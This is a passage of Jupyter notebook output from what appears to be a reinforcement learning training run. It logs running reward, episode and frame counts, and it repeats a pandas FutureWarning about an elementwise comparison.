      "Running reward: 11.00\t Episode 49\t Frame count: 62900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 49\t Frame count: 63000\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63100\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 49\t Frame count: 63300\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63400\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63500\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63600\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63700\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63800\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 63900\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64000\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64100\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64200\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64300\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64400\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64500\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64600\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64700\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 64800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 49\t Frame count: 64900\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 49\t Frame count: 65100\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65200\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65300\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65400\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65500\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65600\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65700\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65800\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 65900\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 66000\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 66100\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 66200\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 66300\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 66400\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 66500\t Context: 1\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 66600\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 66700\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 66800\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 66900\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 67000\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 67100\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 67200\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 67300\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 67400\t Context: 2\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 67500\t Context: 2\n",
      "Running reward: 11.00\t Episode 51\t Frame count: 67600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 51\t Frame count: 67700\t Context: 1\n",
      "Running reward: 11.00\t Episode 51\t Frame count: 67800\t Context: 2\n",
      "Running reward: 11.00\t Episode 51\t Frame count: 67900\t Context: 2\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 52\t Frame count: 68100\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68200\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68300\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68400\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68500\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68600\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68700\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 68800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 52\t Frame count: 68900\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69000\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69100\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69200\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69300\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69400\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69500\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69600\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 52\t Frame count: 69800\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 69900\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70000\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70100\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70200\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 52\t Frame count: 70400\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70500\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70600\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70700\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 70800\t Context: 1\n",
      "Running reward: 11.00\t Episode 53\t Frame count: 70900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 53\t Frame count: 71000\t Context: 1\n",
      "Running reward: 11.00\t Episode 53\t Frame count: 71100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 53\t Frame count: 71200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 53\t Frame count: 71300\t Context: 1\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 71400\t Context: 1\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 71500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 54\t Frame count: 71600\t Context: 2\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 71700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 55\t Frame count: 71800\t Context: 1\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 71900\t Context: 1\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 72000\t Context: 1\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 72100\t Context: 1\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 72200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 55\t Frame count: 72300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 72400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 72500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 72600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 72700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 72800\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 72900\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73000\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73800\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 73900\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74000\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74800\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 74900\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75000\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 75800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 75900\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76000\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76800\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 76900\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 77100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77800\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 77900\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78000\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78500\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78600\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78700\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78800\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 78900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 79000\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79100\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79200\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79300\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79400\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79500\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79600\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79700\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79800\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 79900\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80000\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80100\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80200\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80300\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80400\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80500\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80600\t Context: 2\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 80700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 57\t Frame count: 80800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 57\t Frame count: 80900\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81000\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81100\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 57\t Frame count: 81300\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81400\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 57\t Frame count: 81600\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81700\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81800\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 81900\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82000\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82100\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82200\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82300\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82400\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82500\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82600\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82700\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82800\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 82900\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83000\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83100\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83200\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83300\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83400\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83500\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83600\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83700\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83800\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 83900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 57\t Frame count: 84000\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84100\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84200\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84300\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84400\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84500\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84600\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84700\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84800\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 84900\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 85000\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 85100\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 85200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 58\t Frame count: 85300\t Context: 1\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 85400\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 85500\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 85600\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 85700\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 85800\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 85900\t Context: 2\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 86000\t Context: 1\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 86100\t Context: 1\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 86200\t Context: 1\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 86300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 59\t Frame count: 86400\t Context: 2\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 86500\t Context: 2\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 86600\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 86700\t Context: 1\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 86800\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 86900\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87000\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87100\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87200\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 60\t Frame count: 87400\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87500\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87600\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87700\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87800\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 87900\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88000\t Context: 2\n",
